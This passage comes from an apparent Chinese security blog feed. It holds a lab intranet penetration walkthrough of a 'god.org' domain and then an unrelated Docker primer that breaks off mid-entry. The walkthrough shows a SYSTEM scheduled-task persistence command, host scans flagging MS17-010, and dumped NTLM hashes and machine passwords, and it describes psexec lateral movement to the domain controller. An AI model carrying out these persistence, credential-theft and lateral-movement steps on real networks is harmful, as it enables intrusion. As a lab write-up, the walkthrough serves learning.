class="string">&quot;c:\20241128\system1.exe&quot;</span> /ru system   /f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后我们登陆之后可以看到又上线了一个服务。 </p><h5 id="3-3-内网穿透"><a href="#3-3-内网穿透" class="headerlink" title="3.3 内网穿透"></a>3.3 内网穿透</h5><p>我比较喜欢ew</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250127213558.png" alt="image.png"></p><h5 id="3-4-内网信息收集"><a href="#3-4-内网信息收集" class="headerlink" title="3.4 内网信息收集"></a>3.4 内网信息收集</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">主机名:           STU1</span><br><span class="line"></span><br><span class="line">OS 名称:          Microsoft Windows 7 专业版 </span><br><span class="line"></span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line"></span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line"></span><br><span class="line">OS 配置:          成员工作站</span><br><span class="line"></span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line"></span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line"></span><br><span class="line">注册的组织:       </span><br><span class="line"></span><br><span class="line">产品 ID:          00371-177-0000061-85693</span><br><span class="line"></span><br><span class="line">初始安装日期:     2019/8/25, 9:54:10</span><br><span class="line"></span><br><span class="line">系统启动时间:     2024/11/3, 18:49:58</span><br><span class="line"></span><br><span class="line">系统制造商:       VMware, Inc.</span><br><span class="line"></span><br><span class="line">系统型号:         VMware Virtual Platform</span><br><span class="line"></span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line"></span><br><span class="line">处理器:           安装了 1 个处理器。</span><br><span class="line"></span><br><span class="line">                  [01]: Intel64 Family 6 Model 140 Stepping 1 GenuineIntel ~2419 Mhz</span><br><span class="line"></span><br><span class="line">BIOS 版本:        Phoenix Technologies LTD 6.00, 2020/11/12</span><br><span class="line"></span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line"></span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line"></span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line"></span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line"></span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line"></span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line"></span><br><span class="line">物理内存总量:     2,047 MB</span><br><span class="line"></span><br><span class="line">可用的物理内存:   1,426 MB</span><br><span class="line"></span><br><span class="line">虚拟内存: 最大值: 4,095 MB</span><br><span class="line"></span><br><span class="line">虚拟内存: 可用:   3,381 MB</span><br><span class="line"></span><br><span class="line">虚拟内存: 使用中: 714 MB</span><br><span class="line"></span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line"></span><br><span class="line">域:               god.org</span><br><span class="line"></span><br><span class="line">登录服务器:       暂缺</span><br><span class="line"></span><br><span class="line">修补程序:         安装了 4 个修补程序。</span><br><span class="line"></span><br><span class="line">                  [01]: KB2534111</span><br><span class="line"></span><br><span class="line">                  [02]: KB2999226</span><br><span class="line"></span><br><span class="line">                  [03]: KB958488</span><br><span class="line"></span><br><span class="line">                  [04]: KB976902</span><br><span class="line"></span><br><span class="line">网卡:             安装了 6 个 NIC。</span><br><span class="line"></span><br><span class="line">                  [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line"></span><br><span class="line">                      连接名:      本地连接</span><br><span class="line"></span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line"></span><br><span class="line">                      DHCP 服务器: 192.168.52.254</span><br><span class="line"></span><br><span class="line">                      IP 地址</span><br><span class="line"></span><br><span class="line">                        [01]: 192.168.52.128</span><br><span class="line"></span><br><span class="line">                        [02]: fe80::f0c8:f151:50ba:cf3e</span><br><span class="line"></span><br><span class="line">                  [02]: Bluetooth 设备(个人区域网)</span><br><span class="line"></span><br><span class="line">                      连接名:      Bluetooth 网络连接</span><br><span class="line"></span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line"></span><br><span class="line">                  [03]: TAP-Windows Adapter V9</span><br><span class="line"></span><br><span class="line">                      连接名:      本地连接 2</span><br><span class="line"></span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line"></span><br><span class="line">                  [04]: Microsoft Loopback Adapter</span><br><span class="line"></span><br><span class="line">                      连接名:      Npcap Loopback Adapter</span><br><span class="line"></span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line"></span><br><span class="line">                      DHCP 服务器: 255.255.255.255</span><br><span class="line"></span><br><span class="line">                      IP 地址</span><br><span class="line"></span><br><span class="line">                        [01]: 169.254.129.186</span><br><span class="line"></span><br><span class="line">                        [02]: fe80::b461:ccad:e30f:81ba</span><br><span class="line"></span><br><span class="line">                  [05]: TAP-Windows Adapter V9</span><br><span class="line"></span><br><span class="line">                      连接名:      本地连接 3</span><br><span class="line"></span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line"></span><br><span class="line">                  [06]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line"></span><br><span class="line">                      连接名:      本地连接 5</span><br><span class="line"></span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line"></span><br><span class="line">                      DHCP 服务器: 192.168.53.254</span><br><span class="line"></span><br><span class="line">                      IP 地址</span><br><span class="line"></span><br><span class="line">                        [01]: 192.168.53.129</span><br><span class="line"></span><br><span class="line">                        [02]: fe80::c826:c3b2:e68a:2a1b</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过信息查看我们发现机器可以出网并且在192.168.52.128 这个ip  因此针对这个ip进行c段扫描</p><h6 id="3-4-1-stu1"><a href="#3-4-1-stu1" class="headerlink" title="3.4.1 stu1"></a>3.4.1 stu1</h6><ol><li><p><strong>192.168.52.128</strong> (Windows 7 Professional 7601 Service Pack 1)</p><ul><li><strong>开放端口</strong>:<ul><li>139 (NetBIOS)</li><li>445 (SMB)</li><li>135 (MS RPC)</li><li>80 (HTTP)</li><li>3306 (MySQL)</li><li>MS17-010 (存在漏洞，建议修复)</li></ul></li><li><strong>NetBIOS</strong>:<ul><li>主机名: <code>stu1.god.org</code></li><li>其他 IP 地址: 169.254.129.186, 192.168.52.128, 192.168.2.7</li></ul></li><li><strong>Web应用</strong>:<ul><li><code>phpStudy 探针 2014</code> (位于端口 80，存在潜在的安全风险)</li></ul></li></ul></li></ol><h6 id="3-4-2-owa"><a href="#3-4-2-owa" class="headerlink" title="3.4.2 owa"></a>3.4.2 owa</h6><ol><li><p><strong>192.168.52.138</strong> (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)</p><ul><li><strong>开放端口</strong>:<ul><li>139 (NetBIOS)</li><li>445 (SMB)</li><li>135 (MS RPC)</li><li>80 (HTTP)</li><li>88 (Kerberos)</li><li>MS17-010 (存在漏洞，建议修复)</li></ul></li><li><strong>NetBIOS</strong>:<ul><li>主机名: <code>owa.god.org</code></li><li>其他 IP 地址: 192.168.52.138</li></ul></li><li><strong>Web应用</strong>:<ul><li>IIS7 (位于端口 80，可能是 Web 服务)</li></ul></li></ul></li></ol><h6 id="3-4-3-root-tvi862ubeh"><a href="#3-4-3-root-tvi862ubeh" class="headerlink" title="3.4.3 root-tvi862ubeh"></a>3.4.3 root-tvi862ubeh</h6><ol><li><p><strong>192.168.52.141</strong> (Windows Server 2003 3790)</p><ul><li><strong>开放端口</strong>:<ul><li>139 (NetBIOS)</li><li>445 (SMB)</li><li>135 (MS RPC)</li><li>21 (FTP - 匿名访问)</li><li>7001, 7002 (可能是应用程序端口)</li><li>8099, 8098 (Web 服务)</li><li>MS17-010 (存在漏洞，建议修复)</li></ul></li><li><strong>NetBIOS</strong>:<ul><li>主机名: <code>root-tvi862ubeh</code></li><li>其他 IP 地址: 192.168.52.141</li></ul></li><li><strong>Web应用</strong>:<ul><li><code>Sentinel Keys License Monitor</code> (位于端口 7002)</li><li><code>The page must be viewed over a secure channel</code> (位于端口 8099，返回 403)</li></ul></li><li><strong>FTP服务</strong>:<ul><li>匿名访问 (存在安全隐患)</li></ul></li></ul></li></ol><h6 id="3-4-4-凭据收集"><a href="#3-4-4-凭据收集" class="headerlink" title="3.4.4 凭据收集"></a>3.4.4 凭据收集</h6><p>域管理员<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250130220855.png" alt="image.png"></p><p>域用户<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250130221116.png"></p><p>域控<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250130221452.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">stu1 本地用户</span></span><br><span class="line">Administrator            Guest                    liukaifeng01   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/1/27 21:08:29</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : STU1$</span><br><span class="line">Domain            : GOD</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/1/27 21:08:29</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : STU1$</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * NTLM     : 362b12db4a3b9d0ad31cf8fc5bc99080</span><br><span class="line"> * SHA1     : 5084ad840df7b8e4e7b6d4f6cbab70d765472ec0</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : STU1$</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : e4 c9 97 20 d8 c6 97 f8 7d b2 c4 5f 06 6e 13 89 f0 db 30 f1 26 f0 69 39 a0 67 5c 08 c1 7b c3 83 ea e7 fd b8 7f 72 45 79 a3 9e 19 75 b9 7c 2d c8 64 41 e8 35 45 49 08 57 c9 91 a1 0a 88 0a 36 2a 3c df 37 35 0f c2 d0 3c eb 23 d1 8f 75 13 f0 a9 95 6d d4 5b e3 aa e9 99 64 7b c9 59 7a 33 b1 06 58 13 cf b7 ed d2 af 19 d9 b3 1c b5 4d 37 37 79 4d e0 9e a3 48 2f ab 62 31 c2 26 74 c5 97 46 13 ca 2b 80 b0 ab ac 7b 28 f3 67 40 f0 2e 89 27 e3 1b 35 d6 8d 83 0d 7b 3d 21 66 73 1d db 07 f2 c1 4c b0 be 1b ea 14 55 1e 0e 15 79 e3 c9 81 9e 56 b3 96 34 a1 3f 1c f1 0d 65 a3 ad f0 e3 c5 b8 25 ef 5d 7f 11 57 10 13 c7 c1 42 4e 55 44 1c c1 a4 0f a1 3a ce 57 18 f6 05 28 eb 17 72 fd 30 6f b6 03 95 d3 52 f3 1a 85 5c 91 bd 0f 5e 54 1d 8e f5 </span><br><span class="line">kerberos :</span><br><span class="line"> * Username : stu1$</span><br><span class="line"> * Domain   : GOD.ORG</span><br><span class="line"> * Password : e4 c9 97 20 d8 c6 97 f8 7d b2 c4 5f 06 6e 13 89 f0 db 30 f1 26 f0 69 39 a0 67 5c 08 c1 7b c3 83 ea e7 fd b8 7f 72 45 79 a3 9e 19 75 b9 7c 2d c8 64 41 e8 35 45 49 08 57 c9 91 a1 0a 88 0a 36 2a 3c df 37 35 0f c2 d0 3c eb 23 d1 8f 75 13 f0 a9 95 6d d4 5b e3 aa e9 99 64 7b c9 59 7a 33 b1 06 58 13 cf b7 ed d2 af 19 d9 b3 1c b5 4d 37 37 79 4d e0 9e a3 48 2f ab 62 31 c2 26 74 c5 97 46 13 ca 2b 80 b0 ab ac 7b 28 f3 67 40 f0 2e 89 27 e3 1b 35 d6 8d 83 0d 7b 3d 21 66 73 1d db 07 f2 c1 4c b0 be 1b ea 14 55 1e 0e 15 79 e3 c9 81 9e 56 b3 96 34 a1 3f 1c f1 0d 65 a3 ad f0 e3 c5 b8 25 ef 5d 7f 11 57 10 13 c7 c1 42 4e 55 44 1c c1 a4 0f a1 3a ce 57 18 f6 05 28 eb 17 72 fd 30 6f b6 03 95 d3 52 f3 1a 85 5c 91 bd 0f 5e 54 1d 8e f5 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 52000 (00000000:0000cb20)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/1/27 21:08:29</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : STU1$</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * NTLM     : 362b12db4a3b9d0ad31cf8fc5bc99080</span><br><span class="line"> * SHA1     : 5084ad840df7b8e4e7b6d4f6cbab70d765472ec0</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : STU1$</span><br><span class="line">Domain            : GOD</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/1/27 21:08:29</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : STU1$</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : e4 c9 97 20 d8 c6 97 f8 7d b2 c4 5f 06 6e 13 89 f0 db 30 f1 26 f0 69 39 a0 67 5c 08 c1 7b c3 83 ea e7 fd b8 7f 72 45 79 a3 9e 19 75 b9 7c 2d c8 64 41 e8 35 45 49 08 57 c9 91 a1 0a 88 0a 36 2a 3c df 37 35 0f c2 d0 3c eb 23 d1 8f 75 13 f0 a9 95 6d d4 5b e3 aa e9 99 64 7b c9 59 7a 33 b1 06 58 13 cf b7 ed d2 af 19 d9 b3 1c b5 4d 37 37 79 4d e0 9e a3 48 2f ab 62 31 c2 26 74 c5 97 46 13 ca 2b 80 b0 ab ac 7b 28 f3 67 40 f0 2e 89 27 e3 1b 35 d6 8d 83 0d 7b 3d 21 66 73 1d db 07 f2 c1 4c b0 be 1b ea 14 55 1e 0e 15 79 e3 c9 81 9e 56 b3 96 34 a1 3f 1c f1 0d 65 a3 ad f0 e3 c5 b8 25 ef 5d 7f 11 57 10 13 c7 c1 42 4e 55 44 1c c1 a4 0f a1 3a ce 57 18 f6 05 28 eb 17 72 fd 30 6f b6 03 95 d3 52 f3 1a 85 5c 91 bd 0f 5e 54 1d 8e f5 </span><br><span class="line">kerberos :</span><br><span class="line"> * Username : stu1$</span><br><span class="line"> * Domain   : GOD.ORG</span><br><span class="line"> * Password : e4 c9 97 20 d8 c6 97 f8 7d b2 c4 5f 06 6e 13 89 f0 db 30 f1 26 f0 69 39 a0 67 5c 08 c1 7b c3 83 ea e7 fd b8 7f 72 45 79 a3 9e 19 75 b9 7c 2d c8 64 41 e8 35 45 49 08 57 c9 91 a1 0a 88 0a 36 2a 3c df 37 35 0f c2 d0 3c eb 23 d1 8f 75 13 f0 a9 95 6d d4 5b e3 aa e9 99 64 7b c9 59 7a 33 b1 06 58 13 cf b7 ed d2 af 19 d9 b3 1c b5 4d 37 37 79 4d e0 9e a3 48 2f ab 62 31 c2 26 74 c5 97 46 13 ca 2b 80 b0 ab ac 7b 28 f3 67 40 f0 2e 89 27 e3 1b 35 d6 8d 83 0d 7b 3d 21 66 73 1d db 07 f2 c1 4c b0 be 1b ea 14 55 1e 0e 15 79 e3 c9 81 9e 56 b3 96 34 a1 3f 1c f1 0d 65 a3 ad f0 e3 c5 b8 25 ef 5d 7f 11 57 10 13 c7 c1 42 4e 55 44 1c c1 a4 0f a1 3a ce 57 18 f6 05 28 eb 17 72 fd 30 6f b6 03 95 d3 52 f3 1a 85 5c 91 bd 0f 5e 54 1d 8e f5 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="3-5-横向移动"><a href="#3-5-横向移动" class="headerlink" title="3.5 横向移动"></a>3.5 横向移动</h5><p>很明显,我们目前有Administrator 域管的hash和密码，因此直接横向到Administrator用户拿下域控制器。使用psexec可以直接利用Administrator 的凭据进行横向。拿下域控和一台域主机。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250203113917.png" alt="image.png"></p><h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h4><p>入门级别内网，很简单。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250203115417.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker</title>
      <link href="/2025/02/01/docker/"/>
      <url>/2025/02/01/docker/</url>
      
        <content type="html"><![CDATA[<h4 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h4><p>Docker 就像一个盒子，里面可以装很多物件，如果需要某些物件，可以直接将该盒子拿走，而不需要从该盒子中一件一件的取。</p><p><a href="https://get.docker.com/">docker安装脚本</a></p><p><a href="https://www.docker.org.cn/index.html">Docker中文社区</a>、<a href="https://www.kancloud.cn/jingyucloud/docker/216412">Docker中文文档</a></p><p>Docker 包括三个基本概念:</p><h4 id="镜像（Image）"><a href="#镜像（Image）" class="headerlink" title="镜像（Image）"></a>镜像（Image）</h4><p>Docker的镜像概念类似于虚拟机里的镜像(比如.ISO文件)，是一个只读的模板，一个独立的文件系统，包括运行容器所需的数据，可以用来创建新的容器。<br>例如：一个镜像可以包含一个完整的 ubuntu 操作系统环境，里面仅安装了MySQL或用户需要的其它应用程序。</p><p>这里的镜像就如下方虚拟机创建时候使用的镜像类似。这个镜像便于移动,并且这个镜像我们可以交给任何人使用,其他人使用的时候也很方便,只需要将其实例化即可。</p><h4 id="容器（Container）"><a href="#容器（Container）" class="headerlink" title="容器（Container）"></a>容器（Container）</h4><p>Docker容器是由Docker镜像创建的运行实例，类似VM虚拟机，支持启动，停止，删除等。</p><p>每个容器间是相互隔离的，容器中会运行特定的应用，包含特定应用的代码及所需的依赖文件。</p><p>容器就类似与虚拟机中我们创建好的虚拟机系统,之后我们所有的操作都是在容器中进行的,我们的程序也是运行在容器中。</p><h4 id="仓库（Repository）"><a href="#仓库（Repository）" class="headerlink" title="仓库（Repository）"></a>仓库（Repository）</h4><p>镜像便于传播,而仓库就是专门用来传播这些镜像的地方,他有点类似与Github,或者你可以把他看成一个存放各种镜像的镜像商店</p><p>Docker官方的仓库: 他的服务器处于国外,所以下载速度较慢,不过我们可以通过换源解决。</p><p>daocloud国内仓库: 国内也有一些优秀的商店，他和Docker官方的仓库的区别类似与Github和Gitee的区别。</p><p>网易云镜像中心</p><p>sdn.net&#x2F;qq_39611230&#x2F;article&#x2F;details&#x2F;108641842</p><h5 id="Dockerfile-是什么？如何使用它？"><a href="#Dockerfile-是什么？如何使用它？" class="headerlink" title="Dockerfile 是什么？如何使用它？"></a>Dockerfile 是什么？如何使用它？</h5><p>Dockerfile 是一个文本文件，包含了一系列用于构建 Docker 镜像的指令。通过编写 Dockerfile，您可以定义镜像的构建过程，包括基础镜像选择、环境变量设置、文件复制、命令执行等。通过运行 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写一个dockerfile</span> </span><br><span class="line"></span><br><span class="line">是的，你可以在容器中开放多个端口，并且将这些端口一一映射到宿主机上的不同端口</span><br><span class="line">FROM ubuntu:20.04</span><br><span class="line">EXPOSE 22  # SSH</span><br><span class="line">EXPOSE 80  # HTTP</span><br><span class="line">EXPOSE 443 # HTTPS</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以开放多个</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker run -d -p 2222:22 -p 8080:80 -p 8443:443 my_image 多端口映射</span></span><br></pre></td></tr></table></figure><h4 id="清理垃圾"><a href="#清理垃圾" class="headerlink" title="清理垃圾:"></a>清理垃圾:</h4><p>清理 Docker 中不再使用的容器、镜像和其他资源可以帮助释放磁盘空间并保持系统整洁。以下是一些命令可以用来清理 Docker 垃圾：</p><ol><li>清理停止的容器：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">docker container prune</span><br></pre></td></tr></table></figure><ol><li>清理无效的镜像：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image prune</span><br></pre></td></tr></table></figure><ol><li>清理未被使用的数据卷：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume prune</span><br></pre></td></tr></table></figure><ol><li>清理网络：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network prune</span><br></pre></td></tr></table></figure><ol><li>清理所有不再使用的资源（容器、镜像、数据卷和网络）：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker system prune</span><br></pre></td></tr></table></figure><h4 id="快速安装docker"><a href="#快速安装docker" class="headerlink" title="快速安装docker"></a>快速安装docker</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">陈橘墨 2024-03-20 21:14:25</span><br><span class="line"></span><br><span class="line">大陆环境下没办法直接curl，部分的地区被屏蔽了</span><br><span class="line"></span><br><span class="line">陈橘墨 2024-03-20 21:14:44</span><br><span class="line"></span><br><span class="line">访问https://get.docker.com/，内容保存为install-docker.sh</span><br><span class="line"></span><br><span class="line">陈橘墨 2024-03-20 21:14:47</span><br><span class="line"></span><br><span class="line">chmod +x install-docker.sh</span><br><span class="line"></span><br><span class="line">陈橘墨 2024-03-20 21:14:57</span><br><span class="line"></span><br><span class="line">./install-docker.sh --mirror Aliyun</span><br><span class="line"></span><br><span class="line">陈橘墨 2024-03-20 21:15:13</span><br><span class="line"></span><br><span class="line">就能获得丝滑顺畅的安装体验了</span><br></pre></td></tr></table></figure><h4 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 